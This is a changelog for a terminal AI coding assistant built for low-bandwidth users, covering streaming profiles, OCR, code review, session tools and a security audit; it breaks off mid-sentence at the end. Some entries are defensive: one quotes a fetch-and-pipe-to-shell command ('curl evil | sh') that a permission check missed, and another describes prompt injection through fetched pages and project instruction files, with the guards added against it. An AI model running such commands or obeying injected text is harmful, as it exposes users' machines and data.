## v0.1.109 — 2026-08-20 — a message that told people their connection was broken when it was fine

**Plain-language version:** yesterday's release made answers arrive all at once
on the two slowest connection settings, because sending a reply word by word
costs 27 times more data. That part works. What it broke was a warning message.

The program watches for a worrying silence: if nothing has come back after
twelve seconds it says so, because on a shared or free AI service that usually
means the service is cold and warming up. That made sense when answers always
arrived word by word, because the first word turning up was itself proof that
something was alive. With the answer now arriving in one piece, nothing turns up
until it is finished — so the program saw silence, decided the connection was in
trouble, and said so on every single message, on a fast connection, with a
healthy service. It was seen firing twice inside one answer.

The wording was the damaging part. "A quiet endpoint is usually warming up, not
stuck" is a diagnosis, and it was the wrong one: it sends someone hunting a
broken connection that was never broken. There are now two messages. On the fast
settings the original one stays, because silence there really is a symptom. On
the slow settings it says the quiet is expected, the whole answer is coming at
once, that this uses 27 times less data, that nothing is stalled, and how to
switch back. The short form is in the bottom line, the full sentence in the
conversation, because the bottom line is one row and a long sentence would break
the display.

Also fixed: a model stuck in a loop used to leave you unable to change anything
until it finished. `/context` now works while the AI is working, so you can
switch off the tools it is looping on — the change is recorded straight away and
applied when the current answer ends. And the busy message now mentions that
escape cancels, which it always did; nothing had ever said so.

**Not changed, deliberately:** you still cannot switch model mid-answer. Opening
the model list is harmless, but choosing from it replaces the connection the
running request is using. Press escape first, then switch — the safer order
anyway.

## v0.1.108 — 2026-08-20 — your connection is now a setting, and answers can arrive in one piece

**Plain-language version:** this program is built for people whose internet is a
satellite phone or a weak mobile signal, where data is bought by the megabyte
and often cannot be topped up with a card. Everything needed to survive a bad
connection was already built and already measured. None of it could be found:
every setting was an environment variable, so the person on a 2 KB/s satellite
link had to read the source code to survive on it. There are now five profiles
you pick from a list, from Austere (a satellite phone or a 2G signal) up to
Unconstrained (Starlink, modern 4G and 5G). A profile changes how patiently the
program waits before deciding your connection is dead, and how much data one
message may spend. It never changes what the AI can do.

The picker shows an estimate of your speed and never downloads anything to
measure it. That is a rule, not a shortcut: at 2 KB/s a 100 KB test file costs
about 50 seconds and real money to report something you already know, and with a
one-to-two-second satellite round trip it would measure the delay rather than
the speed. The estimate times traffic that was going to happen anyway. On first
run there has been none, so the screen says nothing has been measured and asks
you to pick the line that sounds like your connection, instead of inventing a
suggestion it cannot support.

One thing you will see immediately. On the two slowest profiles the answer now
arrives all at once instead of typing itself out. When the AI writes a word at a
time, each word is sent in its own package with a full label wrapped around it,
and the labels are far bigger than the words: measured on the same answer,
22,256 bytes word-by-word against 834 bytes in one piece. Twenty-seven times the
data for an identical reply. The AI company charges you the same either way —
106 words counted on both routes — so this is not the AI bill, it is the data
bill, and where data is prepaid by the megabyte that is money out of a pocket.
You lose the gradual appearance, and it becomes harder to tell a slow answer
from a stuck one. You lose nothing else. The screen explains all of it so you
can overrule it, and a faster profile or GORILLA_OPENCODE_STREAM=1 does that.

Also: a message too big for your data ceiling used to be reported as the
connection failing, sending you to debug a link that was working perfectly. It
now says the connection is fine and the conversation has grown too big for this
profile.

Each profile also sets its own retry ceiling — two attempts on a satellite
phone, five on a fast line. Retrying is not free on these links: every attempt
re-uploads the whole conversation, so on a prepaid plan a retry limit is a
spending limit.

**Not done, and said here rather than discovered later:** none of this has run
on a genuinely slow connection. It was built and tested on a fast one, against
measurements taken in August with a deliberately broken link.

## v0.1.107 — 2026-08-19 — the one I said was fine

**Plain-language version:** yesterday's release audited four tools and fixed ten
problems, and the notes said two tools were checked and deliberately left alone.
The owner's reply was, in effect: check those too. One was fine. The other had a
bug that cost a full minute every time and then lied about what happened.

Ask the program to run a shell command ending in `exit` — something like
`build.sh || exit 1`, an ordinary thing to write — and the command ran, worked,
and had its output captured. Then the shell it ran in shut itself down, because
that is what `exit` does. The program waited for a result that was never coming,
and sixty seconds later reported "Command execution timed out or was
interrupted". Every part of that is wrong except the waiting.

It matters more than the minute. An assistant told "this timed out" does the
sensible thing and tries again, or raises the time limit, or tells you the
machine is hanging — all the wrong fix, for a command that had already worked.
It now returns instantly and says the shell session ended, that `exit` is the
usual reason, that the output above is real, and that the exit code was lost
with the shell. Sixty seconds down to a hundredth of one.

The other tool really was fine. Web search distinguishes three situations rather
than two — every source failed, nothing found but coverage incomplete, and
results found with some sources down — each worded differently, including an
explicit instruction not to substitute remembered citations when a search fails.
That is the standard the rest of this week has been trying to reach.

The honest bit: I did not test the shell tool before saying it was fine. I
reasoned about it, decided it made sense, and wrote that in the release notes.
That is the second time in one day — earlier, a test I wrote to catch a bug
caught me committing the same bug in my own list of programming languages.
Reasoning about what a program does is a guess; running it is the answer.

## v0.1.106 — 2026-08-19 — ten ways it could have lied to you

**Plain-language version:** the search tool replaced three older ones, so it now
runs on almost every message. It failed yesterday in a small specific way, and
the obvious question followed: what else can go wrong like that? So the whole
tool got audited — not for crashes, but for one particular kind of lie.

"No matches found" is a statement about YOUR CODE. "The filter didn't work" is a
statement about THE REQUEST. If a tool says the first when it means the second,
the assistant believes it, tells you your project doesn't have the thing, and
never tries again. A confident wrong answer with no sign anything went wrong.

Ten of those were found. Asking for .github/** said "no matches" on a project
with three CI files sitting right there. A typo in the language filter — pyton
instead of python — returned nothing, which reads as "this project has no Python
in it". Viewing a binary file printed its raw bytes into the conversation as if
they were source, with a 5 MB limit and everything re-sent on every message
after. An empty file and a failed read looked identical. Reading past the end of
a file looked like an empty file. Asking which files have uncommitted changes,
outside a git repository, said "no matches" — same as a clean repository. A web
page built by JavaScript came back blank, which reads as "this page is empty".
And the language-breakdown view timed out because it was counting lines inside
1.1 GB of release packages: 30 seconds down to 1.6.

The test written to catch the typo bug failed immediately against my own work —
I had typed the list of valid languages from memory and invented six that do not
exist. Same bug, committed while fixing the bug. The list is now read from the
tool itself rather than written down, because a hand-copied list of someone
else's data goes stale silently and always toward a wrong answer.

Two things deliberately left alone: a failing shell command reports its exit
code without being flagged an error, because grep exits 1 for "no match" and
test exits 1 for "false" — flagging those would turn correct answers into
errors. And web search already tells "every source failed" apart from "nothing
found".

## v0.1.105 — 2026-08-19 — it can read your screenshots

**Plain-language version:** yesterday someone asked this program to read a
screenshot and it said it could not read images. That was true of the AI and
false of the computer — tesseract, the tool that reads text out of pictures, was
already installed on that machine and had been for months. Nothing connected the
two. That single gap produced everything built since: the tooling research, the
/arsenal capability map, and now this.

Before it was written, the owner watched a model work around the problem on its
own: it went looking for tesseract, found it, wrote its own command to run it
over every file, and read the text back. It worked — after several attempts, one
broken command it had to apologise for, and a permission prompt each time. The
ability was there and the route to it was awful. This is the same power without
the fumbling: an image now reads the way a file reads.

Point it at a screenshot and it gives you the words, labelled as a
TRANSCRIPTION rather than the picture, with a warning that OCR confuses similar
shapes and loses layout. In the first live test the model used that warning
correctly and unprompted, spotting that a capital L in a package name was an OCR
artifact because Debian package names are always lowercase. It reads words only
— it cannot tell you what a photograph shows. "No text found" is an answer, not
a failure. And if your machine has no OCR it gives you the one command that
fixes it, free and no account, rather than just refusing.

The part that nearly shipped broken: with OCR wired in and tested, a live model
STILL refused, because the tool's own description still said "cannot display
binary files or images". It read that and believed it, correctly. This program
already had that exact failure written down about its web-fetching tool. A
capability the description denies does not exist, however well it is built.

## v0.1.104 — 2026-08-19 — it knows where your pictures are

**Plain-language version:** someone asked it to look in their screenshots
folder. It searched the entire home directory, got back documentation images
from unrelated projects, tried again and gave up after thirty seconds, then
guessed at /home/gorilla/Pictures through a shell command. Two minutes and three
attempts for a folder the operating system could have named instantly.

The obvious reading is that the model is not very clever. The fairer one is that
the program never told it. Your computer already knows where your pictures live
— every Linux desktop writes it into ~/.config/user-dirs.dirs — and the short
description of your machine that the assistant gets at the start of every
conversation simply never mentioned it.

That matters more than it looks, because guessing is worse than useless on most
of the world's computers: in German the folder is Bilder, in Spanish Imagenes,
in Japanese it is written in Japanese. An assistant guessing "Pictures" in
English fails on exactly the machines this project exists to serve.

Three folders are now listed — Documents, Downloads, Pictures — read from your
own configuration, and only if they really exist. Three rather than six: the
full set cost 66 tokens on every single message and these cost 41. Videos and
Music are not a coding assistant's business, and it can ask if it ever needs
them. Anything riding every message is money taken repeatedly rather than once.

The search timeout used to say "narrow it with path or glob", which is true and
useless — the assistant had just said where it was looking. It now says what
searching a whole home directory actually means and points at the folder list.

Verified with the identical request: two tool calls instead of three, no
timeout, straight to the right folder.

## v0.1.103 — 2026-08-19 — /arsenal is a window, and the screenshots to prove it

**Plain-language version:** three layout corrections and the first proper
photographs of the new features. All three came from someone using the program
and sending screenshots, none were visible to the test suite, and two were not
bugs at all — they were decisions of mine that looked fine in a test and wrong
on a screen.

/arsenal was the only page taking the entire terminal width. So it covered the
sidebar, and its border landed on the very edge of the screen where a border is
indistinguishable from no border. Both got reported as bugs. It is a window now,
like every other page.

It was also padding itself out to the full height of the terminal: eight lines
of content in a box with thirty blank lines underneath, covering your
conversation to display nothing. That reads as a program that stopped halfway. I
had done it deliberately for a constant frame height; the rule that actually
matters is never TALLER than your terminal, not always exactly it. 23 rows now
instead of 52.

docs/SCREENSHOTS.md gains a section for this release: the capability list with
real measured costs, the install plan with the exact command, the research cost
dialog with its rules drawing correctly at last, the /osint explainer, and the
agent declining to spend money on a joke question. Full size, click through to
the original, every number a real measurement.

That last one needs its caveat read: it is one run, one model, one question. The
arithmetic it used is ours; the decision to refuse is the model's; it has not
been tested across models, and the write-up says so.

## v0.1.102 — 2026-08-19 — it says when it has finished

**Plain-language version:** two bugs, both found by someone using the program
and sending a screenshot, neither visible to the test suite.

Pressing p in /arsenal asks your package manager what a selection really costs,
which takes a second, so it says "measuring with apt...". It never stopped
saying it. The answer arrived and went into the header — 97.9 MB, 331.0 MB
on disk, about 3.4 hours — while the line underneath still said it was working.
The screen was showing the result and denying it had it, at the same time, and
anyone reading that concludes the program has hung. A thing that has finished
must not still look like a thing that is running. The message is replaced by its
outcome now, failures included.

The same screenshot showed the page stopping partway down with no bottom edge.
The page was fine; the surface underneath it was not. Pop-ups are refused
permission to be taller than the thing they sit on — sensible — but in the
scrolling-text mode the thing they sit on is only the conversation and the
status bar, which is short. So a full-screen page painted onto it had its bottom
rows and its border quietly trimmed. Measured: a 40-row page on a 2-row
background came back as 2 rows. That is the exact reverse of what the trimming
was written to prevent, and it only happens in the mode this project recommends
for older machines. The background is filled out to the full height of the
terminal now, before anything is placed on it, which fixes every pop-up.

Worth saying plainly: the page was correct and the test proving the page is
exactly the height of your terminal was correct. The picture was still wrong.
Neither of them was looking at the surface underneath.

## v0.1.101 — 2026-08-19 — lines that can't misbehave

**Plain-language version:** continuous drawn lines kept mangling the display —
doubled, stacked, overlapping, misaligned. The fix is plain dashes, the way DOS
and Unix did it, and the reasons turned out to be solid on all three counts.

Box-drawing characters are formally "ambiguous width": one column on most
terminals, TWO on a terminal set up for Chinese, Japanese or Korean. The program
measures one; when the terminal draws two the line no longer fits, and the
drawing library's answer to a line that doesn't fit is not to complain but to
WRAP it onto a second row. So the mistake is about width and the symptom is
about height, somewhere else, with nothing connecting them — which is exactly
why it kept being misdiagnosed. They also break when cut at the wrong byte, and
they are genuinely slower to measure: 12,361 nanoseconds against 404 for plain
ASCII on a 100-character line, thirty times, because the library has a fast path
for plain characters. I expected that last one to be irrelevant. It isn't.

The worst offenders were rules typed out by hand at a fixed length that looked
right in one window — too long in any narrower one, so each wrapped and added a
row, three of them at once on the same screen. They are measured now, not typed.

Everything that draws is plain ASCII: rules, bullets, separators, arrows, the
truncation marker, table lines, the progress bar, the drop shadow behind pop-ups
(which was a colour all along, the fancy character was just carrying it). Across
66 files, 1,798 risky characters down to 195, none of which draw anything.
Borders and tables are NOT banned — the library ships an ASCII border style.

Two things were deliberately left: the image viewer's half-block, which IS the
technique for showing two pixels in one cell, and the gorilla warning banner's
middle dots, chosen yesterday for a reason. Both now say so in the code.

It uncovered two real bugs that had been hiding behind a one-character marker:
session titles were always one over their limit, and a page I wrote yesterday
reserved one column for a marker that takes three. And a test now fails if a
box-drawing character reappears in anything that draws — because recording the
individual mistakes had already been tried three times and did not work.

## v0.1.100 — 2026-08-19 — /arsenal says what it did

**Plain-language version:** v0.1.99 shipped /arsenal, and within minutes the
first person to use it reported that space selected nothing and p showed no
costs. Both keys were working perfectly — and that was the problem. The page
opens on the first group, "The minimum", and on that machine all eight of those
tools were already installed. So space correctly selected nothing, and p then
correctly priced an empty selection. Two keys doing exactly the right thing and
looking completely broken.

This project's own rules say it: silence and success must never look alike. The
behaviour was right, the missing feedback was the bug. Every keypress now
reports itself — "All 8 of these are already installed, nothing to select",
"selected 2 (3 already installed, skipped), press p to measure the cost" — and
then the cost appears as it always did.

No test caught it because every test picked tools that were MISSING, since that
is the interesting case. The uninteresting one is what the user hit first.

The page is also full screen now, which was the owner's call over my smaller fix
— and going there immediately exposed two real width bugs the smaller box had
been hiding, one of which rendered a 27-row frame inside a 20-row terminal.

While fixing all that, a defect turned up that nobody reported: four keys were
written in a way where the program might have thrown away the work they had just
done, depending on the compiler. It happened to work with this one, which is the
worst kind of working. Written explicitly now, with a test.

## v0.1.99 — 2026-08-19 — /arsenal

**Plain-language version:** yesterday somebody asked the AI to read a
screenshot and it said it could not read images. That was true of the AI and
false of the computer — tesseract, the tool that reads text out of pictures,
was already installed on that machine and had been for months. Nothing had ever
told anybody it was there.

That is not a missing feature, it is a missing MAP. Nobody stumbles across
binwalk or sleuthkit or ssdeep, and you cannot ask for something you do not know
exists. The barrier was never the download — plenty of people will leave a
machine going overnight. The barrier is that nobody tells you what is out there.

So: type /arsenal and the program checks YOUR machine for about thirty
capabilities and shows what you have, what you do not, and what the rest would
cost. For every single one, in plain words: what it is, what the AI could then
do, what will disappoint you about it, and the exact command to get it.
Slackware style — take a whole group, walk it item by item, or pick single
tools.

Press p and your own package manager works out the real cost, counting what you
already have, so the number is true for your machine and not a worst case from a
table. On the machine this was built on, everything missing is 134 MB to
download and about four and a half hours on a slow line. That number is there so
you can decide — not to talk you out of it. "Everything" is always one key away.

It never installs anything and never asks for your password: it shows the
command and you run it. Everything listed is free and needs no account. Press s
and your selection saves as an ordinary text file you can hand to somebody
else — which is the point, because then the next person gets the map for free.

Three things were wrong and were caught by USING it rather than by any test: a
tool with no package for your system was priced at zero, which reads as free
when it actually means unobtainable; a tool that WAS installed was reported
missing because it answers to two names; and pressing the install key spent a
paid AI turn to explain what the program already knew.

## v0.1.98 — 2026-08-19 — the sink, not just the source

**Plain-language version:** every safety check in this program protected the
START of an action — is this command safe, is this file inside your project.
Nothing protected the END of one. That matters because the program reads web
pages, a web page is written by whoever owns that website, and it can contain
text aimed at the AI rather than at you. If the AI falls for it, the next thing
it does is a perfectly ordinary-looking request to a website; the only thing
wrong with that request is what happened three steps earlier.

So: fetched pages now arrive fenced off, with a sentence AFTER them saying this
is data and not instructions. That position is the whole mechanism — researchers
measured the warning-first ordering making things worse than no warning at all,
and making the AI refuse ordinary work two times in three. The conversation now
remembers it has read something risky, and until you type again, anything
leaving your machine asks first. And "approve everything" is no longer quite
everything: egress, folders outside your project, and a conversation that just
read a stranger's words still ask — once each, remembered afterwards. When a
question does appear in that mode, it now says why.

An MCP server URL was dialled with no checks at all, so the address where cloud
providers keep their unprotected password list was a valid MCP server. Now
refused — while your own machine and home network stay allowed, because that is
how people actually run these.

Numbers that were wrong: your token counts were answering two different
questions with one pair of figures, so a saved transcript reported one turn as
though it were the whole conversation. MCP tools were not counted on the
/context screen at all. That screen now also admits its figures run about 10%
high rather than printing an estimate in the typography of a measurement.

AGENTS.md — the open standard 60,000+ projects use for project instructions —
was not read at all, while a competitor's file and three capitalisations of this
program's own name were. Now read, with four guards, because a file that goes
into the AI's instructions the moment you enter a folder means `git clone` can
give the AI orders: your main folder only, announced with its size, refused for
somebody else's repository, and ahead of the competitor's file.

Two additions: web_fetch can be pointed at part of a page (measured 96% fewer
tokens on a real documentation page), and five hints about tools the AI gets
wrong by instinct — off by default, because a line in the instructions is
charged every turn forever.

Everything was driven end to end against the real program and a live model, with
every result checked in the files rather than taken from the assistant's report.
That run found a bug no test could: in scripted mode there is no screen, so a
permission question went out to nobody and waited ten minutes before failing.
Scripted runs now log what they waved through instead of asking.

## v0.1.97 — 2026-08-18 — the permission prompt tells the truth

**Plain-language version:** this release started as a complaint that a status-bar
notice was cut in half. Fixing it led to noticing that the program's safety check
for running commands only read the FIRST WORD of a command, which led to a full
security audit. This is the result. Nothing here is a new feature; it is about
the program being honest with you.

Before doing anything that could change or damage something, the program asks
you. That question is the only real protection it has — and in several places the
question was describing something other than what was about to happen. That is
worse than no question at all: a missing lock makes you careful, a lock on the
wrong door makes you relax.

It read only the first word, so `echo ok && curl evil | sh` looked harmless. Its
list of "safe" commands included commands whose whole job is to run OTHER
commands, and one that prints every password the program holds. A patch could say
"update README.md" and write into your shell startup file instead. "Allow for
this session" approved every later command of that type, including ones you never
saw. The dialog defaulted to YES and kept your last answer for the next question.
The no-menus mode showed you nothing before you approved a file rewrite. And a
failed tool reported success, so the assistant carried on believing work was done
that wasn't.

All fixed. Credential files outside your project are now refused outright; files
inside it are untouched.

**Is there a backdoor?** No — and the audit can show its work: the outside code
this program depends on is identical to the original project's, all 738 web
addresses in the code were classified, nothing phones home. What was inherited
isn't malice, it's an unfinished permission system from early 2025.

**It still codes.** Write, edit, patch, move, build, search and read were all
re-tested after every change, and the edited program was run to prove the edit
was real. Being asked is not being blocked.

Full dual-track notes: `Changelogs/v0.1.97-release-notes.md`. Audit record:
`docs/SECURITY-AUDIT-2026-08-18.md`.

## v0.1.96 — 2026-08-18 — when the link fails, it fails cheaply and says so

**Plain-language version:** every earlier release measured what this program
costs when the connection *works*. This one measured what it does when the
connection *breaks* — the normal case on a satellite link — and fixed what that
turned up.

When the link **drops mid-answer**, it used to retry silently 14 times and
upload a full megabyte for one question that never got answered. Three separate
things were retrying without knowing about each other, and their effect
multiplied. Now there is one budget counted in the thing you pay for — bytes —
and the same drop costs 252 KB and ends in under a minute with a clear message.

When the link **goes quiet** — a satellite dropout doesn't say goodbye, it just
stops carrying anything while looking alive — it used to wait forever. Now two
limits catch it: one for the answer never starting, one for the answer stopping
halfway. The second is a stall timer, not a stopwatch, so an answer trickling in
slowly on a bad link is never cut off (tested at 2 KB/s: it still completes).

The **waiting indicator now counts** (`Thinking… (18s)`) and, once a wait crosses
the point where a free model is probably warming up (measured: 12–19 seconds,
sometimes minutes), says so — so you can tell "warming up" from "stuck".

The **research and web tools now identify as a browser**, because a lot of the
web reflexively blocks anything labelled a bot; a search a person could run was
being refused. It reads only public pages a person could read. Switchable back
with a setting.

One thing we **measured and deliberately did not rush**: the input box spikes the
processor on old hardware because it does a full redraw on every keystroke to
size itself. That is real — but the redraw is also a documented correctness fix,
so we recorded exactly what it costs, found the one safe way to speed it up, and
left the code alone until there is a proper test behind the change.

Full dual-track notes: `Changelogs/v0.1.96-release-notes.md`.

## v0.1.95 — 2026-08-18 — /review takes options, and every depth says what it skipped

**Plain-language version:** v0.1.94 shipped `/review` with one argument: a
folder. Anything else you typed was treated as a folder name — so `/review
--deep` asked for a review of a directory called "--deep".

That is the same defect as `/osint --recover` earlier the same day: a flag read
as content. Written hours later, after the lesson was filed, and after a test
was added that was supposed to catch that class — except that test only checks
whether a command *mentioned in prose* exists. It has nothing to say about a
command mishandling its own arguments. There is now one that does, and it types
what a person actually types: flags before the path, flags after the path,
`--sec`, `--fast`, `--focus=security`, and a bare word that really is a
directory called `security`.

**And now the depth is yours to choose.** The engine underneath was never blunt —
it has four stages and escalates to the deep security tools *by itself* for any
file whose output mentions a CWE, a CVE, an overflow, an injection, a hardcoded
secret, a race, a path traversal or a format string. Only the files that earn
it. That was already happening; nothing exposed it.

| you type | what happens |
|---|---|
| `/review` | fast checks and static analysis, with the deep pass escalating on its own where the evidence justifies it. Usually the right one. |
| `/review --quick` | linters and formatters only. Seconds. |
| `/review --security` | forces the deep pass over everything, reports only security findings. |
| `/review --full` | every stage over every file. |
| `/review --diff HEAD` | only what you changed. |

They combine in any order: `/review --security --diff HEAD internal/auth`.

**Every depth declares what it skipped.** A quick pass says outright that it
"cannot have found a buffer overrun, an injection, or a leaked credential, and
says nothing about whether one is there". Without that, a quick pass is exactly
the same lie as an analyser that was never installed — the reader believes the
code was checked for something nobody looked for. A security-focused report
states how many findings it filtered out, and the real total.

A mistyped option is named back to you rather than guessed at or silently
ignored. `/review --secrutiy internal/auth` reviews nothing and says which
option it did not recognise, because running the wrong review wastes real time.

Full detail, both tracks: [docs/CODE-REVIEW.md](../docs/CODE-REVIEW.md).

## v0.1.94 — 2026-08-18 — /review: thirty static-analysis and security tools, built in

**Plain-language version:** Type `/review` and the program runs around thirty
real code-analysis and security tools over your code — `cppcheck`, `gosec`,
`bandit`, `semgrep`, `clippy`, `shellcheck`, `gitleaks` and the rest — picking
whichever suit the languages you actually have. They find the mechanical faults:
memory errors, injection holes, leaked credentials, errors nobody checked. The
tools live inside the program; nothing is downloaded when you run it.

**The part that makes it trustworthy.** A review that found nothing because
nothing was installed looks exactly like a review that found nothing because
your code is fine. That is the worst way a review tool can fail, and no small
model can spot it. So every answer *starts* with which tools ran, which are
missing and which failed — before a single finding — and says the code a missing
tool covers is **UNREVIEWED**, in those words. If nothing is installed for your
language it refuses to run at all rather than hand you a comforting blank page.

It also flags every line that two or more **different** tools objected to
independently. Not "the AI thinks this matters" — two separate programs, written
by different people, disagreeing with the same line. Those are computed, and
they are never truncated.

**What it will not do**, and it says so every time: find wrong logic, a broken
assumption, or an error quietly swallowed. No static tool finds those. This is
half a review, and `/review` instructs the model to read the changed code itself
and tell you it did.

**Measured, on a real run over 50 files:** 17 analysers, 42 seconds, **739,476
bytes of raw JSON returned as a 7,315-byte summary** — a 99% reduction, because
every tool result is re-sent on every later turn. The trust block and the
corroborated findings are never cut; the long tail is capped at 60, sorted
most-severe-first, with the real total always stated.

The whole toolkit is embedded in the binary: **444 KB of payload, +480 KB of
binary**, about fifty seconds on an 8 KB/s line. "Install this other thing
first" is a wall, not a step, for the people this is built for — the same
reasoning that made `lynx` a hard dependency.

**A test this change had to fix, worth naming.** The loadout calibration test
asserted that a row's measured token count *differs* from its hand-written
estimate — a proxy for "calibration ran". `tool.review` measured 475 tokens, the
estimate was corrected from 320 to 475, and the test promptly declared the
correct figure a guess. It now stamps a sentinel no real schema can produce and
asserts calibration overwrote it. Same failure class as a limit counted in the
wrong unit: a proxy breaks exactly in the case it was meant to reward.

Also in this release: the first live run flagged credentials in two OAuth files.
They are installed-app client credentials publicly embedded in the open-source
Gemini and Antigravity CLIs, and were never confidential. The toolkit reported
their location and **withheld every value from the report**, which is the rule
that matters more than the finding.

Full detail, both tracks: [docs/CODE-REVIEW.md](../docs/CODE-REVIEW.md).

## v0.1.93 — 2026-08-18 — /resume: pick up work that stopped, or work another model started

**Plain-language version:** v0.1.92 let you find and reopen a past conversation.
Reopening is the right answer for a short chat and the wrong one for a long job
— and a long job is exactly what gets interrupted. Reopening loads every message
back in, so on a 275-message session it reproduces the failure that stopped the
work in the first place. The bigger the job, the more certainly reopening it
fails, which is backwards.

**`/resume`** does the other thing. Pick a conversation, press Ctrl+R, and the
program writes a short brief and starts a **fresh** conversation with just that:
everything you asked for, word for word and in order — including your
corrections, which are the most valuable lines in any session because they record
where the last attempt went wrong — which files were changed, which commands were
run, what went wrong and where it stopped.

And then it says what it does **not** know: whether any of the work was correct,
and whether it was finished. That is the part that makes it safe to hand to a
different model. A brief that reads as settled fact turns "someone was working on
this" into "this is done", and that is how half-finished work gets built on or
committed.

The brief is written by the program itself, in ordinary code — no AI is asked to
work out what happened, because that is exactly the step that already failed
once. Driven against a real 106-message research run with 16 helper sessions, it
produced a brief carrying the goal verbatim and seven distinct helper failures
(three empty searches, two timeouts, a missing path, a 403), attributed to the
lane that hit each one.

**One bug worth naming, because it wasted the most time.** The scripted edit that
added the Ctrl+R handler targeted three tabs of indentation where the file used
two. The replacement matched nothing, changed nothing, and the script exited
successfully — so the help line, the command list and the notes all advertised a
key that had no code behind it. Four rounds of live testing then appeared to rule
out Ctrl+R, F5, Shift+Tab and Insert; not one of them had ever been bound. The
signal was there and was missed: when four independent candidates fail in exactly
the same way, the fault is in the path they share, not in the candidates. There
is now a test that asserts every advertised action actually emits its message,
and it catches this in a second.

Full detail, both tracks:
[docs/SESSIONS-AND-STORAGE.md](../docs/SESSIONS-AND-STORAGE.md).

## v0.1.92 — 2026-08-18 — /sessions: reach a conversation you are no longer in, and actually get your disk back

**Plain-language version:** Two things this program could not do, and both of
them matter most on the machines it is built for.

**It could not reach a conversation you had left.** The session switcher showed
titles and nothing else — no date, no size, no search — and "save this
conversation" could only ever save the one currently open. That assumes you are
still sitting in the session you care about. On a fifteen-year-old laptop with a
battery measured in minutes, the power cut ends the session, and sometimes the
power does not come back for days.

**It could not delete anything at all.** Conversations accumulated forever, with
no way to see what they cost. The people this is built for have 1 to 2 GB of
free space on eMMC or CompactFlash, not 500 GB.

`/sessions` lists every conversation you have ever had, newest first, with the
date, the message count and **how much space it takes up**. Type to search — it
looks inside the messages, not just the titles, because titles are generated and
"New Session" is a real title this program writes. Enter reopens one. Ctrl+E
saves one to a file. DEL erases one for good and returns the space to your disk.

**About that last part.** Deleting rows from a SQLite database frees no disk
whatsoever — the space is marked reusable and the file stays exactly the same
size. Measured in this release's own test: 1,073,152 bytes, delete every message,
still 1,073,152 bytes, rebuild the file, 65,536 bytes. On a device with 1 GB
free, an erase that returns nothing is not an erase. So erasing rebuilds the file
and reports what the *filesystem* shows. Driven through the real interface on a
real store: 5,575,048 bytes before, 2,351,104 after, screen said **"Erased 24
sessions · 3.1 MB returned to the disk"**. Twenty-four, because one conversation
plus the twenty-three helper sessions it had spawned — those were invisible
before, and they held most of the bytes.

The header shows what the database occupies **on disk**, not what the messages
add up to. On this machine those were 9.4 MB and 4.6 MB: a write-ahead log had
grown to 4.3 MB and nothing had ever truncated it. Nearly half the space was in a
file nobody was counting.

Exports now carry the whole run. A research conversation listed 275 messages and
exported 14 — the other 261 lived in twenty-three helper sessions, which is where
every piece of reasoning and every tool call was. The export is 2.6 MB and holds
238 tool calls with their inputs and results, and 119 reasoning blocks. That is
deliberate: when something goes wrong you need to be able to work out *how* it
published something private, or *how* it deleted something. A record of the
visible chat alone cannot answer either question.

Six bugs found while building it, every one by driving the real binary rather
than by a test that existed at the time: the export dropping 95% of a run; the
size column vanishing whenever a title was long (which is almost always, since
titles are generated); a row with double-width characters wrapping because
truncation counted runes instead of display columns; the search box ignoring
fast typing and every paste, because bubbletea coalesces input into one
multi-rune key message; two of the three action keys never arriving at all; and
the dialog drawing 32 rows in a 24-row window.

That last key problem deserves naming, because the answer was already written
down. Ctrl+S is XOFF and freezes a terminal that has software flow control on —
and this program already binds it globally. Ctrl+D is EOF. Both facts were
recorded in this repo before the screen existed, in the comment explaining why
the provider escape hatch is a slash command and not a key binding. Erase is now
on DEL and sorting on Tab, and a test pins it.

Full detail, both tracks, with every measurement and where it came from:
[docs/SESSIONS-AND-STORAGE.md](../docs/SESSIONS-AND-STORAGE.md).

## v0.1.91 — 2026-08-18 — `/osint --recover`: the command that was documented before it existed

**Plain-language version:** Yesterday's release added a safety net for expensive
research runs. When the helpers finish, their graded findings are written
straight to disk by the program itself, before any AI is asked to do anything
with them — so a run that collects good material and then dies at the write-up
stage does not lose the material.

The findings file told you what to do next: *run `/osint --recover`*. So did the
tool's own report. **That command did not exist.** Typing it sent the literal
text `--recover` into a ten-helper professional dossier as the subject to
investigate. The model refused — "I cannot fabricate a dossier about
'--recover', that's a flag, not a question" — which was exactly right, and cost
the user the setup of a run to find out.

It exists now, and it does the job properly. It lists every past run that
collected findings, showing what was asked, when, how many lanes reported, and
what it cost. Pick one and it is written up as a dossier — with **no searching,
no helpers, and nothing collected again.**

The reason it works where the original run failed is arithmetic, not cleverness.
A run last night spent about 850,000 tokens and died with its context at 145% of
the model's window. But the findings themselves were never big: the strict report
format had already compressed two hours of searching down to about 15,000
tokens. What drowned the run was everything else it was carrying — raw tool
output, its own reasoning, the whole conversation. So the write-up now happens in
a **fresh conversation carrying only the findings**.

Proven against the real thing: **five dead runs from last night were recovered
from the local store**, totalling roughly 1.3 million tokens of work that had
been sitting there unusable. Their distilled findings measured between 696 and
22,448 tokens.

Three smaller things, each found by testing rather than by reading:

- The picker **listed every recovered run twice** — once as its saved file and
  once as the sessions it was built from. Caught the first time the screen was
  driven live: eleven entries for six runs.
- It claimed **"8 of 8 lanes reported"** for a run that was cancelled after two
  minutes, where six of the eight had emitted nothing but "let me check the
  memory directories". It was inferring coverage from token counts, which
  narration also produces. It now states only what it actually knows.
- The list drew **32 rows in a 24-row terminal**. Caught by an automated check
  before it ever reached a screen — a frame taller than the window scrolls the
  terminal and wrecks the layout.

**Developer notes.** `internal/llm/agent/research_recover.go` extracts runs in
pure Go — grouping helper sessions by tool-call id, pulling each lane's final
report, pairing supervisor audits to the lanes they judged — so recovery costs
nothing and cannot fail the way the write-up failed. `ListSessions` filters to
`parent_session_id IS NULL` and correctly hides helper sessions from the session
picker, which returned zero runs from a store holding five; the hand-written
`internal/db/research_helpers.go` asks the question the picker cannot.

## v0.1.90 — 2026-08-17 — all-source analysis, and four ways the program was lying about itself

Full dual-track document: [v0.1.90-release-notes.md](v0.1.90-release-notes.md).

**Plain-language version:** This release is mostly about honesty. Four things the
program was quietly getting wrong, all found in one evening of real use.

It was **burning a third of your processor doing nothing at all**. A little
spinning animation kept ticking eight times a second forever, whether or not
anything was happening, and every tick redrew the whole screen. On an idle,
empty session that measured 35% of a processor core; in a long conversation, 59%.
It also made the program feel frozen when it was busy, because your keypresses
queued up behind all that pointless redrawing. It now animates only while
something is actually working: **35% down to 9%**.

It was **asking your permission over and over for the same thing**. When you send
ten helpers to research something, each one is its own little session, and
"allow for this session" was being remembered against whichever helper happened
